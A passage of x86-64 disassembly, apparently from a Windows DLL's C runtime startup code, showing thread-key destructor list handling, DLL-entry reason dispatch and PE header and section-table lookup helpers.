    6d8cde33:	e8 08 07 00 00       	call   0x6d8ce540
    6d8cde38:	83 c8 ff             	or     $0xffffffff,%eax
    6d8cde3b:	e9 02 ff ff ff       	jmp    0x6d8cdd42
    6d8cde40:	ba 01 00 00 00       	mov    $0x1,%edx
    6d8cde45:	b9 04 00 00 00       	mov    $0x4,%ecx
    6d8cde4a:	e8 f1 06 00 00       	call   0x6d8ce540
    6d8cde4f:	83 c8 ff             	or     $0xffffffff,%eax
    6d8cde52:	e9 eb fe ff ff       	jmp    0x6d8cdd42
    6d8cde57:	90                   	nop
    6d8cde58:	90                   	nop
    6d8cde59:	90                   	nop
    6d8cde5a:	90                   	nop
    6d8cde5b:	90                   	nop
    6d8cde5c:	90                   	nop
    6d8cde5d:	90                   	nop
    6d8cde5e:	90                   	nop
    6d8cde5f:	90                   	nop
    6d8cde60:	55                   	push   %rbp
    6d8cde61:	57                   	push   %rdi
    6d8cde62:	56                   	push   %rsi
    6d8cde63:	53                   	push   %rbx
    6d8cde64:	48 83 ec 28          	sub    $0x28,%rsp
    6d8cde68:	48 8d 0d 71 f9 0e 00 	lea    0xef971(%rip),%rcx        # 0x6d9bd7e0
    6d8cde6f:	ff 15 7f 33 10 00    	call   *0x10337f(%rip)        # 0x6d9d11f4
    6d8cde75:	48 8b 1d 44 f9 0e 00 	mov    0xef944(%rip),%rbx        # 0x6d9bd7c0
    6d8cde7c:	48 85 db             	test   %rbx,%rbx
    6d8cde7f:	74 33                	je     0x6d8cdeb4
    6d8cde81:	48 8b 2d 04 34 10 00 	mov    0x103404(%rip),%rbp        # 0x6d9d128c
    6d8cde88:	48 8b 3d 85 33 10 00 	mov    0x103385(%rip),%rdi        # 0x6d9d1214
    6d8cde8f:	90                   	nop
    6d8cde90:	8b 0b                	mov    (%rbx),%ecx
    6d8cde92:	ff d5                	call   *%rbp
    6d8cde94:	48 89 c6             	mov    %rax,%rsi
    6d8cde97:	ff d7                	call   *%rdi
    6d8cde99:	85 c0                	test   %eax,%eax
    6d8cde9b:	75 0e                	jne    0x6d8cdeab
    6d8cde9d:	48 85 f6             	test   %rsi,%rsi
    6d8cdea0:	74 09                	je     0x6d8cdeab
    6d8cdea2:	48 8b 43 08          	mov    0x8(%rbx),%rax
    6d8cdea6:	48 89 f1             	mov    %rsi,%rcx
    6d8cdea9:	ff d0                	call   *%rax
    6d8cdeab:	48 8b 5b 10          	mov    0x10(%rbx),%rbx
    6d8cdeaf:	48 85 db             	test   %rbx,%rbx
    6d8cdeb2:	75 dc                	jne    0x6d8cde90
    6d8cdeb4:	48 8d 0d 25 f9 0e 00 	lea    0xef925(%rip),%rcx        # 0x6d9bd7e0
    6d8cdebb:	48 83 c4 28          	add    $0x28,%rsp
    6d8cdebf:	5b                   	pop    %rbx
    6d8cdec0:	5e                   	pop    %rsi
    6d8cdec1:	5f                   	pop    %rdi
    6d8cdec2:	5d                   	pop    %rbp
    6d8cdec3:	48 ff 25 72 33 10 00 	rex.W jmp *0x103372(%rip)        # 0x6d9d123c
    6d8cdeca:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
    6d8cded0:	55                   	push   %rbp
    6d8cded1:	57                   	push   %rdi
    6d8cded2:	56                   	push   %rsi
    6d8cded3:	53                   	push   %rbx
    6d8cded4:	48 83 ec 28          	sub    $0x28,%rsp
    6d8cded8:	8b 05 ea f8 0e 00    	mov    0xef8ea(%rip),%eax        # 0x6d9bd7c8
    6d8cdede:	31 f6                	xor    %esi,%esi
    6d8cdee0:	85 c0                	test   %eax,%eax
    6d8cdee2:	89 cd                	mov    %ecx,%ebp
    6d8cdee4:	48 89 d7             	mov    %rdx,%rdi
    6d8cdee7:	75 0b                	jne    0x6d8cdef4
    6d8cdee9:	89 f0                	mov    %esi,%eax
    6d8cdeeb:	48 83 c4 28          	add    $0x28,%rsp
    6d8cdeef:	5b                   	pop    %rbx
    6d8cdef0:	5e                   	pop    %rsi
    6d8cdef1:	5f                   	pop    %rdi
    6d8cdef2:	5d                   	pop    %rbp
    6d8cdef3:	c3                   	ret
    6d8cdef4:	ba 18 00 00 00       	mov    $0x18,%edx
    6d8cdef9:	b9 01 00 00 00       	mov    $0x1,%ecx
    6d8cdefe:	e8 8d 06 00 00       	call   0x6d8ce590
    6d8cdf03:	48 85 c0             	test   %rax,%rax
    6d8cdf06:	48 89 c3             	mov    %rax,%rbx
    6d8cdf09:	74 3d                	je     0x6d8cdf48
    6d8cdf0b:	89 28                	mov    %ebp,(%rax)
    6d8cdf0d:	48 8d 0d cc f8 0e 00 	lea    0xef8cc(%rip),%rcx        # 0x6d9bd7e0
    6d8cdf14:	48 89 78 08          	mov    %rdi,0x8(%rax)
    6d8cdf18:	ff 15 d6 32 10 00    	call   *0x1032d6(%rip)        # 0x6d9d11f4
    6d8cdf1e:	48 8b 05 9b f8 0e 00 	mov    0xef89b(%rip),%rax        # 0x6d9bd7c0
    6d8cdf25:	48 8d 0d b4 f8 0e 00 	lea    0xef8b4(%rip),%rcx        # 0x6d9bd7e0
    6d8cdf2c:	48 89 1d 8d f8 0e 00 	mov    %rbx,0xef88d(%rip)        # 0x6d9bd7c0
    6d8cdf33:	48 89 43 10          	mov    %rax,0x10(%rbx)
    6d8cdf37:	ff 15 ff 32 10 00    	call   *0x1032ff(%rip)        # 0x6d9d123c
    6d8cdf3d:	89 f0                	mov    %esi,%eax
    6d8cdf3f:	48 83 c4 28          	add    $0x28,%rsp
    6d8cdf43:	5b                   	pop    %rbx
    6d8cdf44:	5e                   	pop    %rsi
    6d8cdf45:	5f                   	pop    %rdi
    6d8cdf46:	5d                   	pop    %rbp
    6d8cdf47:	c3                   	ret
    6d8cdf48:	be ff ff ff ff       	mov    $0xffffffff,%esi
    6d8cdf4d:	eb 9a                	jmp    0x6d8cdee9
    6d8cdf4f:	90                   	nop
    6d8cdf50:	53                   	push   %rbx
    6d8cdf51:	48 83 ec 20          	sub    $0x20,%rsp
    6d8cdf55:	8b 05 6d f8 0e 00    	mov    0xef86d(%rip),%eax        # 0x6d9bd7c8
    6d8cdf5b:	85 c0                	test   %eax,%eax
    6d8cdf5d:	89 cb                	mov    %ecx,%ebx
    6d8cdf5f:	75 0f                	jne    0x6d8cdf70
    6d8cdf61:	31 c0                	xor    %eax,%eax
    6d8cdf63:	48 83 c4 20          	add    $0x20,%rsp
    6d8cdf67:	5b                   	pop    %rbx
    6d8cdf68:	c3                   	ret
    6d8cdf69:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
    6d8cdf70:	48 8d 0d 69 f8 0e 00 	lea    0xef869(%rip),%rcx        # 0x6d9bd7e0
    6d8cdf77:	ff 15 77 32 10 00    	call   *0x103277(%rip)        # 0x6d9d11f4
    6d8cdf7d:	48 8b 05 3c f8 0e 00 	mov    0xef83c(%rip),%rax        # 0x6d9bd7c0
    6d8cdf84:	48 85 c0             	test   %rax,%rax
    6d8cdf87:	74 1a                	je     0x6d8cdfa3
    6d8cdf89:	8b 10                	mov    (%rax),%edx
    6d8cdf8b:	39 d3                	cmp    %edx,%ebx
    6d8cdf8d:	75 0b                	jne    0x6d8cdf9a
    6d8cdf8f:	eb 4f                	jmp    0x6d8cdfe0
    6d8cdf91:	8b 11                	mov    (%rcx),%edx
    6d8cdf93:	39 da                	cmp    %ebx,%edx
    6d8cdf95:	74 29                	je     0x6d8cdfc0
    6d8cdf97:	48 89 c8             	mov    %rcx,%rax
    6d8cdf9a:	48 8b 48 10          	mov    0x10(%rax),%rcx
    6d8cdf9e:	48 85 c9             	test   %rcx,%rcx
    6d8cdfa1:	75 ee                	jne    0x6d8cdf91
    6d8cdfa3:	48 8d 0d 36 f8 0e 00 	lea    0xef836(%rip),%rcx        # 0x6d9bd7e0
    6d8cdfaa:	ff 15 8c 32 10 00    	call   *0x10328c(%rip)        # 0x6d9d123c
    6d8cdfb0:	31 c0                	xor    %eax,%eax
    6d8cdfb2:	48 83 c4 20          	add    $0x20,%rsp
    6d8cdfb6:	5b                   	pop    %rbx
    6d8cdfb7:	c3                   	ret
    6d8cdfb8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
    6d8cdfbf:	00 
    6d8cdfc0:	48 8b 51 10          	mov    0x10(%rcx),%rdx
    6d8cdfc4:	48 89 50 10          	mov    %rdx,0x10(%rax)
    6d8cdfc8:	e8 9b 05 00 00       	call   0x6d8ce568
    6d8cdfcd:	48 8d 0d 0c f8 0e 00 	lea    0xef80c(%rip),%rcx        # 0x6d9bd7e0
    6d8cdfd4:	ff 15 62 32 10 00    	call   *0x103262(%rip)        # 0x6d9d123c
    6d8cdfda:	eb d4                	jmp    0x6d8cdfb0
    6d8cdfdc:	0f 1f 40 00          	nopl   0x0(%rax)
    6d8cdfe0:	48 8b 50 10          	mov    0x10(%rax),%rdx
    6d8cdfe4:	48 89 c1             	mov    %rax,%rcx
    6d8cdfe7:	48 89 15 d2 f7 0e 00 	mov    %rdx,0xef7d2(%rip)        # 0x6d9bd7c0
    6d8cdfee:	eb d8                	jmp    0x6d8cdfc8
    6d8cdff0:	53                   	push   %rbx
    6d8cdff1:	48 83 ec 20          	sub    $0x20,%rsp
    6d8cdff5:	83 fa 01             	cmp    $0x1,%edx
    6d8cdff8:	0f 84 92 00 00 00    	je     0x6d8ce090
    6d8cdffe:	72 30                	jb     0x6d8ce030
    6d8ce000:	83 fa 02             	cmp    $0x2,%edx
    6d8ce003:	74 1b                	je     0x6d8ce020
    6d8ce005:	83 fa 03             	cmp    $0x3,%edx
    6d8ce008:	75 1b                	jne    0x6d8ce025
    6d8ce00a:	8b 05 b8 f7 0e 00    	mov    0xef7b8(%rip),%eax        # 0x6d9bd7c8
    6d8ce010:	85 c0                	test   %eax,%eax
    6d8ce012:	74 11                	je     0x6d8ce025
    6d8ce014:	e8 47 fe ff ff       	call   0x6d8cde60
    6d8ce019:	eb 0a                	jmp    0x6d8ce025
    6d8ce01b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
    6d8ce020:	e8 8b 04 00 00       	call   0x6d8ce4b0
    6d8ce025:	b8 01 00 00 00       	mov    $0x1,%eax
    6d8ce02a:	48 83 c4 20          	add    $0x20,%rsp
    6d8ce02e:	5b                   	pop    %rbx
    6d8ce02f:	c3                   	ret
    6d8ce030:	8b 05 92 f7 0e 00    	mov    0xef792(%rip),%eax        # 0x6d9bd7c8
    6d8ce036:	85 c0                	test   %eax,%eax
    6d8ce038:	0f 85 82 00 00 00    	jne    0x6d8ce0c0
    6d8ce03e:	8b 05 84 f7 0e 00    	mov    0xef784(%rip),%eax        # 0x6d9bd7c8
    6d8ce044:	83 f8 01             	cmp    $0x1,%eax
    6d8ce047:	75 dc                	jne    0x6d8ce025
    6d8ce049:	48 8b 0d 70 f7 0e 00 	mov    0xef770(%rip),%rcx        # 0x6d9bd7c0
    6d8ce050:	48 85 c9             	test   %rcx,%rcx
    6d8ce053:	74 11                	je     0x6d8ce066
    6d8ce055:	48 8b 59 10          	mov    0x10(%rcx),%rbx
    6d8ce059:	e8 0a 05 00 00       	call   0x6d8ce568
    6d8ce05e:	48 85 db             	test   %rbx,%rbx
    6d8ce061:	48 89 d9             	mov    %rbx,%rcx
    6d8ce064:	75 ef                	jne    0x6d8ce055
    6d8ce066:	48 8d 0d 73 f7 0e 00 	lea    0xef773(%rip),%rcx        # 0x6d9bd7e0
    6d8ce06d:	48 c7 05 48 f7 0e 00 	movq   $0x0,0xef748(%rip)        # 0x6d9bd7c0
    6d8ce074:	00 00 00 00 
    6d8ce078:	c7 05 46 f7 0e 00 00 	movl   $0x0,0xef746(%rip)        # 0x6d9bd7c8
    6d8ce07f:	00 00 00 
    6d8ce082:	ff 15 64 31 10 00    	call   *0x103164(%rip)        # 0x6d9d11ec
    6d8ce088:	eb 9b                	jmp    0x6d8ce025
    6d8ce08a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
    6d8ce090:	8b 05 32 f7 0e 00    	mov    0xef732(%rip),%eax        # 0x6d9bd7c8
    6d8ce096:	85 c0                	test   %eax,%eax
    6d8ce098:	74 16                	je     0x6d8ce0b0
    6d8ce09a:	c7 05 24 f7 0e 00 01 	movl   $0x1,0xef724(%rip)        # 0x6d9bd7c8
    6d8ce0a1:	00 00 00 
    6d8ce0a4:	b8 01 00 00 00       	mov    $0x1,%eax
    6d8ce0a9:	48 83 c4 20          	add    $0x20,%rsp
    6d8ce0ad:	5b                   	pop    %rbx
    6d8ce0ae:	c3                   	ret
    6d8ce0af:	90                   	nop
    6d8ce0b0:	48 8d 0d 29 f7 0e 00 	lea    0xef729(%rip),%rcx        # 0x6d9bd7e0
    6d8ce0b7:	ff 15 77 31 10 00    	call   *0x103177(%rip)        # 0x6d9d1234
    6d8ce0bd:	eb db                	jmp    0x6d8ce09a
    6d8ce0bf:	90                   	nop
    6d8ce0c0:	e8 9b fd ff ff       	call   0x6d8cde60
    6d8ce0c5:	e9 74 ff ff ff       	jmp    0x6d8ce03e
    6d8ce0ca:	90                   	nop
    6d8ce0cb:	90                   	nop
    6d8ce0cc:	90                   	nop
    6d8ce0cd:	90                   	nop
    6d8ce0ce:	90                   	nop
    6d8ce0cf:	90                   	nop
    6d8ce0d0:	48 63 41 3c          	movslq 0x3c(%rcx),%rax
    6d8ce0d4:	48 01 c1             	add    %rax,%rcx
    6d8ce0d7:	31 c0                	xor    %eax,%eax
    6d8ce0d9:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
    6d8ce0df:	74 01                	je     0x6d8ce0e2
    6d8ce0e1:	c3                   	ret
    6d8ce0e2:	31 c0                	xor    %eax,%eax
    6d8ce0e4:	66 81 79 18 0b 02    	cmpw   $0x20b,0x18(%rcx)
    6d8ce0ea:	0f 94 c0             	sete   %al
    6d8ce0ed:	c3                   	ret
    6d8ce0ee:	66 90                	xchg   %ax,%ax
    6d8ce0f0:	66 81 39 4d 5a       	cmpw   $0x5a4d,(%rcx)
    6d8ce0f5:	74 09                	je     0x6d8ce100
    6d8ce0f7:	31 c0                	xor    %eax,%eax
    6d8ce0f9:	c3                   	ret
    6d8ce0fa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
    6d8ce100:	eb ce                	jmp    0x6d8ce0d0
    6d8ce102:	0f 1f 40 00          	nopl   0x0(%rax)
    6d8ce106:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    6d8ce10d:	00 00 00 
    6d8ce110:	48 63 41 3c          	movslq 0x3c(%rcx),%rax
    6d8ce114:	48 01 c1             	add    %rax,%rcx
    6d8ce117:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
    6d8ce11b:	48 8d 44 01 18       	lea    0x18(%rcx,%rax,1),%rax
    6d8ce120:	0f b7 49 06          	movzwl 0x6(%rcx),%ecx
    6d8ce124:	85 c9                	test   %ecx,%ecx
    6d8ce126:	74 29                	je     0x6d8ce151
    6d8ce128:	83 e9 01             	sub    $0x1,%ecx
    6d8ce12b:	48 8d 0c 89          	lea    (%rcx,%rcx,4),%rcx
    6d8ce12f:	4c 8d 4c c8 28       	lea    0x28(%rax,%rcx,8),%r9
    6d8ce134:	44 8b 40 0c          	mov    0xc(%rax),%r8d
    6d8ce138:	49 39 d0             	cmp    %rdx,%r8
    6d8ce13b:	4c 89 c1             	mov    %r8,%rcx
    6d8ce13e:	77 08                	ja     0x6d8ce148
    6d8ce140:	03 48 08             	add    0x8(%rax),%ecx
    6d8ce143:	48 39 d1             	cmp    %rdx,%rcx
    6d8ce146:	77 0b                	ja     0x6d8ce153
    6d8ce148:	48 83 c0 28          	add    $0x28,%rax
    6d8ce14c:	4c 39 c8             	cmp    %r9,%rax
    6d8ce14f:	75 e3                	jne    0x6d8ce134
    6d8ce151:	31 c0                	xor    %eax,%eax
    6d8ce153:	c3                   	ret
    6d8ce154:	66 90                	xchg   %ax,%ax
    6d8ce156:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    6d8ce15d:	00 00 00 
    6d8ce160:	57                   	push   %rdi
    6d8ce161:	56                   	push   %rsi
    6d8ce162:	53                   	push   %rbx
    6d8ce163:	48 83 ec 20          	sub    $0x20,%rsp
    6d8ce167:	48 89 ce             	mov    %rcx,%rsi
    6d8ce16a:	e8 c1 03 00 00       	call   0x6d8ce530
    6d8ce16f:	48 83 f8 08          	cmp    $0x8,%rax
    6d8ce173:	77 6b                	ja     0x6d8ce1e0
    6d8ce175:	48 8b 15 94 a6 0e 00 	mov    0xea694(%rip),%rdx        # 0x6d9b8810
    6d8ce17c:	66 81 3a 4d 5a       	cmpw   $0x5a4d,(%rdx)
    6d8ce181:	75 5d                	jne    0x6d8ce1e0
    6d8ce183:	48 89 d1             	mov    %rdx,%rcx
    6d8ce186:	e8 45 ff ff ff       	call   0x6d8ce0d0
    6d8ce18b:	85 c0                	test   %eax,%eax
    6d8ce18d:	74 51                	je     0x6d8ce1e0
    6d8ce18f:	48 63 4a 3c          	movslq 0x3c(%rdx),%rcx
    6d8ce193:	48 01 d1             	add    %rdx,%rcx
    6d8ce196:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
    6d8ce19a:	48 8d 5c 01 18       	lea    0x18(%rcx,%rax,1),%rbx
    6d8ce19f:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
    6d8ce1a3:	85 c0                	test   %eax,%eax
    6d8ce1a5:	74 39                	je     0x6d8ce1e0
    6d8ce1a7:	83 e8 01             	sub    $0x1,%eax
    6d8ce1aa:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
    6d8ce1ae:	48 8d 7c c3 28       	lea    0x28(%rbx,%rax,8),%rdi
    6d8ce1b3:	eb 09                	jmp    0x6d8ce1be
    6d8ce1b5:	48 83 c3 28          	add    $0x28,%rbx
    6d8ce1b9:	48 39 fb             	cmp    %rdi,%rbx
    6d8ce1bc:	74 22                	je     0x6d8ce1e0
    6d8ce1be:	41 b8 08 00 00 00    	mov    $0x8,%r8d
    6d8ce1c4:	48 89 f2             	mov    %rsi,%rdx
    6d8ce1c7:	48 89 d9             	mov    %rbx,%rcx
    6d8ce1ca:	e8 59 03 00 00       	call   0x6d8ce528
    6d8ce1cf:	85 c0                	test   %eax,%eax
    6d8ce1d1:	75 e2                	jne    0x6d8ce1b5
    6d8ce1d3:	48 89 d8             	mov    %rbx,%rax
    6d8ce1d6:	48 83 c4 20          	add    $0x20,%rsp
    6d8ce1da:	5b                   	pop    %rbx
    6d8ce1db:	5e                   	pop    %rsi
    6d8ce1dc:	5f                   	pop    %rdi
    6d8ce1dd:	c3                   	ret
    6d8ce1de:	66 90                	xchg   %ax,%ax
    6d8ce1e0:	31 db                	xor    %ebx,%ebx
    6d8ce1e2:	48 89 d8             	mov    %rbx,%rax
    6d8ce1e5:	48 83 c4 20          	add    $0x20,%rsp
    6d8ce1e9:	5b                   	pop    %rbx
    6d8ce1ea:	5e                   	pop    %rsi
    6d8ce1eb:	5f                   	pop    %rdi
    6d8ce1ec:	c3                   	ret
    6d8ce1ed:	0f 1f 00             	nopl   (%rax)
    6d8ce1f0:	48 83 ec 28          	sub    $0x28,%rsp
    6d8ce1f4:	4c 8b 05 15 a6 0e 00 	mov    0xea615(%rip),%r8        # 0x6d9b8810
    6d8ce1fb:	66 41 81 38 4d 5a    	cmpw   $0x5a4d,(%r8)
    6d8ce201:	48 89 ca             	mov    %rcx,%rdx
    6d8ce204:	75 57                	jne    0x6d8ce25d
    6d8ce206:	4c 89 c1             	mov    %r8,%rcx
    6d8ce209:	e8 c2 fe ff ff       	call   0x6d8ce0d0
    6d8ce20e:	85 c0                	test   %eax,%eax
    6d8ce210:	74 4b                	je     0x6d8ce25d
    6d8ce212:	49 63 40 3c          	movslq 0x3c(%r8),%rax
    6d8ce216:	48 89 d1             	mov    %rdx,%rcx
    6d8ce219:	4c 29 c1             	sub    %r8,%rcx
    6d8ce21c:	49 01 c0             	add    %rax,%r8
    6d8ce21f:	41 0f b7 50 06       	movzwl 0x6(%r8),%edx
    6d8ce224:	41 0f b7 40 14       	movzwl 0x14(%r8),%eax
    6d8ce229:	85 d2                	test   %edx,%edx
    6d8ce22b:	49 8d 44 00 18       	lea    0x18(%r8,%rax,1),%rax
    6d8ce230:	74 2b                	je     0x6d8ce25d
    6d8ce232:	83 ea 01             	sub    $0x1,%edx
    6d8ce235:	48 8d 14 92          	lea    (%rdx,%rdx,4),%rdx
    6d8ce239:	4c 8d 4c d0 28       	lea    0x28(%rax,%rdx,8),%r9
    6d8ce23e:	66 90                	xchg   %ax,%ax
    6d8ce240:	44 8b 40 0c          	mov    0xc(%rax),%r8d
    6d8ce244:	4c 39 c1             	cmp    %r8,%rcx
    6d8ce247:	4c 89 c2             	mov    %r8,%rdx
    6d8ce24a:	72 08                	jb     0x6d8ce254
    6d8ce24c:	03 50 08             	add    0x8(%rax),%edx
    6d8ce24f:	48 39 d1             	cmp    %rdx,%rcx
    6d8ce252:	72 0b                	jb     0x6d8ce25f
    6d8ce254:	48 83 c0 28          	add    $0x28,%rax
    6d8ce258:	4c 39 c8             	cmp    %r9,%rax
    6d8ce25b:	75 e3                	jne    0x6d8ce240
    6d8ce25d:	31 c0                	xor    %eax,%eax
    6d8ce25f:	48 83 c4 28          	add    $0x28,%rsp
    6d8ce263:	c3                   	ret
    6d8ce264:	66 90                	xchg   %ax,%ax
    6d8ce266:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    6d8ce26d:	00 00 00 
    6d8ce270:	48 83 ec 28          	sub    $0x28,%rsp
    6d8ce274:	48 8b 15 95 a5 0e 00 	mov    0xea595(%rip),%rdx        # 0x6d9b8810
    6d8ce27b:	45 31 c0             	xor    %r8d,%r8d
    6d8ce27e:	66 81 3a 4d 5a       	cmpw   $0x5a4d,(%rdx)
    6d8ce283:	74 0b                	je     0x6d8ce290
    6d8ce285:	44 89 c0             	mov    %r8d,%eax
    6d8ce288:	48 83 c4 28          	add    $0x28,%rsp
    6d8ce28c:	c3                   	ret
    6d8ce28d:	0f 1f 00             	nopl   (%rax)
    6d8ce290:	48 89 d1             	mov    %rdx,%rcx
    6d8ce293:	e8 38 fe ff ff       	call   0x6d8ce0d0
    6d8ce298:	85 c0                	test   %eax,%eax
    6d8ce29a:	74 e9                	je     0x6d8ce285
    6d8ce29c:	48 63 42 3c          	movslq 0x3c(%rdx),%rax
    6d8ce2a0:	44 0f b7 44 10 06    	movzwl 0x6(%rax,%rdx,1),%r8d
    6d8ce2a6:	44 89 c0             	mov    %r8d,%eax
    6d8ce2a9:	48 83 c4 28          	add    $0x28,%rsp
    6d8ce2ad:	c3                   	ret
    6d8ce2ae:	66 90                	xchg   %ax,%ax
    6d8ce2b0:	48 83 ec 28          	sub    $0x28,%rsp
    6d8ce2b4:	4c 8b 05 55 a5 0e 00 	mov    0xea555(%rip),%r8        # 0x6d9b8810
    6d8ce2bb:	66 41 81 38 4d 5a    	cmpw   $0x5a4d,(%r8)
    6d8ce2c1:	48 89 ca             	mov    %rcx,%rdx
    6d8ce2c4:	75 52                	jne    0x6d8ce318
    6d8ce2c6:	4c 89 c1             	mov    %r8,%rcx
    6d8ce2c9:	e8 02 fe ff ff       	call   0x6d8ce0d0
    6d8ce2ce:	85 c0                	test   %eax,%eax
    6d8ce2d0:	74 46                	je     0x6d8ce318
    6d8ce2d2:	49 63 48 3c          	movslq 0x3c(%r8),%rcx
    6d8ce2d6:	4c 01 c1             	add    %r8,%rcx
    6d8ce2d9:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
    6d8ce2dd:	48 8d 44 01 18       	lea    0x18(%rcx,%rax,1),%rax
    6d8ce2e2:	0f b7 49 06          	movzwl 0x6(%rcx),%ecx
    6d8ce2e6:	85 c9                	test   %ecx,%ecx
    6d8ce2e8:	74 2e                	je     0x6d8ce318
    6d8ce2ea:	83 e9 01             	sub    $0x1,%ecx
    6d8ce2ed:	48 8d 0c 89          	lea    (%rcx,%rcx,4),%rcx
    6d8ce2f1:	48 8d 4c c8 28       	lea    0x28(%rax,%rcx,8),%rcx
    6d8ce2f6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    6d8ce2fd:	00 00 00 
    6d8ce300:	f6 40 27 20          	testb  $0x20,0x27(%rax)
    6d8ce304:	74 09                	je     0x6d8ce30f
    6d8ce306:	48 85 d2             	test   %rdx,%rdx
    6d8ce309:	74 0f                	je     0x6d8ce31a
    6d8ce30b:	48 83 ea 01          	sub    $0x1,%rdx
    6d8ce30f:	48 83 c0 28          	add    $0x28,%rax
    6d8ce313:	48 39 c8             	cmp    %rcx,%rax
    6d8ce316:	75 e8                	jne    0x6d8ce300
    6d8ce318:	31 c0                	xor    %eax,%eax
    6d8ce31a:	48 83 c4 28          	add    $0x28,%rsp
    6d8ce31e:	c3                   	ret
    6d8ce31f:	90                   	nop
    6d8ce320:	48 83 ec 28          	sub    $0x28,%rsp
    6d8ce324:	48 8b 15 e5 a4 0e 00 	mov    0xea4e5(%rip),%rdx        # 0x6d9b8810
    6d8ce32b:	66 81 3a 4d 5a       	cmpw   $0x5a4d,(%rdx)
    6d8ce330:	75 1e                	jne    0x6d8ce350
    6d8ce332:	48 89 d1             	mov    %rdx,%rcx
    6d8ce335:	e8 96 fd ff ff       	call   0x6d8ce0d0
    6d8ce33a:	85 c0                	test   %eax,%eax
    6d8ce33c:	b8 00 00 00 00       	mov    $0x0,%eax
    6d8ce341:	48 0f 45 c2          	cmovne %rdx,%rax
    6d8ce345:	48 83 c4 28          	add    $0x28,%rsp
    6d8ce349:	c3                   	ret
    6d8ce34a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
    6d8ce350:	31 c0                	xor    %eax,%eax
    6d8ce352:	48 83 c4 28          	add    $0x28,%rsp
    6d8ce356:	c3                   	ret
    6d8ce357:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
    6d8ce35e:	00 00 
    6d8ce360:	48 83 ec 28          	sub    $0x28,%rsp
    6d8ce364:	4c 8b 05 a5 a4 0e 00 	mov    0xea4a5(%rip),%r8        # 0x6d9b8810
    6d8ce36b:	31 c0                	xor    %eax,%eax
    6d8ce36d:	66 41 81 38 4d 5a    	cmpw   $0x5a4d,(%r8)
    6d8ce373:	48 89 ca             	mov    %rcx,%rdx
    6d8ce376:	74 08                	je     0x6d8ce380
    6d8ce378:	48 83 c4 28          	add    $0x28,%rsp
    6d8ce37c:	c3                   	ret
    6d8ce37d:	0f 1f 00             	nopl   (%rax)
    6d8ce380:	4c 89 c1             	mov    %r8,%rcx
    6d8ce383:	e8 48 fd ff ff       	call   0x6d8ce0d0
    6d8ce388:	85 c0                	test   %eax,%eax
    6d8ce38a:	74 ec                	je     0x6d8ce378
    6d8ce38c:	49 63 40 3c          	movslq 0x3c(%r8),%rax
    6d8ce390:	48 89 d1             	mov    %rdx,%rcx
    6d8ce393:	4c 29 c1             	sub    %r8,%rcx
    6d8ce396:	49 01 c0             	add    %rax,%r8
    6d8ce399:	41 0f b7 50 06       	movzwl 0x6(%r8),%edx
    6d8ce39e:	41 0f b7 40 14       	movzwl 0x14(%r8),%eax
    6d8ce3a3:	85 d2                	test   %edx,%edx
    6d8ce3a5:	49 8d 44 00 18       	lea    0x18(%r8,%rax,1),%rax
    6d8ce3aa:	74 31                	je     0x6d8ce3dd
    6d8ce3ac:	83 ea 01             	sub    $0x1,%edx
    6d8ce3af:	48 8d 14 92          	lea    (%rdx,%rdx,4),%rdx
    6d8ce3b3:	4c 8d 4c d0 28       	lea    0x28(%rax,%rdx,8),%r9
    6d8ce3b8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
    6d8ce3bf:	00 
    6d8ce3c0:	44 8b 40 0c          	mov    0xc(%rax),%r8d
    6d8ce3c4:	4c 39 c1             	cmp    %r8,%rcx
    6d8ce3c7:	4c 89 c2             	mov    %r8,%rdx
    6d8ce3ca:	72 08                	jb     0x6d8ce3d4
    6d8ce3cc:	03 50 08             	add    0x8(%rax),%edx
    6d8ce3cf:	48 39 d1             	cmp    %rdx,%rcx
    6d8ce3d2:	72 10                	jb     0x6d8ce3e4
    6d8ce3d4:	48 83 c0 28          	add    $0x28,%rax
    6d8ce3d8:	4c 39 c8             	cmp    %r9,%rax
    6d8ce3db:	75 e3                	jne    0x6d8ce3c0
    6d8ce3dd:	31 c0                	xor    %eax,%eax
    6d8ce3df:	48 83 c4 28          	add    $0x28,%rsp
    6d8ce3e3:	c3                   	ret
    6d8ce3e4:	8b 40 24             	mov    0x24(%rax),%eax
    6d8ce3e7:	f7 d0                	not    %eax
    6d8ce3e9:	c1 e8 1f             	shr    $0x1f,%eax
    6d8ce3ec:	48 83 c4 28          	add    $0x28,%rsp
    6d8ce3f0:	c3                   	ret
    6d8ce3f1:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
    6d8ce3f6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    6d8ce3fd:	00 00 00 
    6d8ce400:	48 83 ec 28          	sub    $0x28,%rsp
    6d8ce404:	4c 8b 1d 05 a4 0e 00 	mov    0xea405(%rip),%r11        # 0x6d9b8810
    6d8ce40b:	66 41 81 3b 4d 5a    	cmpw   $0x5a4d,(%r11)
    6d8ce411:	41 89 c9             	mov    %ecx,%r9d
    6d8ce414:	75 58                	jne    0x6d8ce46e
    6d8ce416:	4c 89 d9             	mov    %r11,%rcx
    6d8ce419:	e8 b2 fc ff ff       	call   0x6d8ce0d0
    6d8ce41e:	85 c0                	test   %eax,%eax
    6d8ce420:	74 4c                	je     0x6d8ce46e
    6d8ce422:	49 63 43 3c          	movslq 0x3c(%r11),%rax
    6d8ce426:	4c 01 d8             	add    %r11,%rax
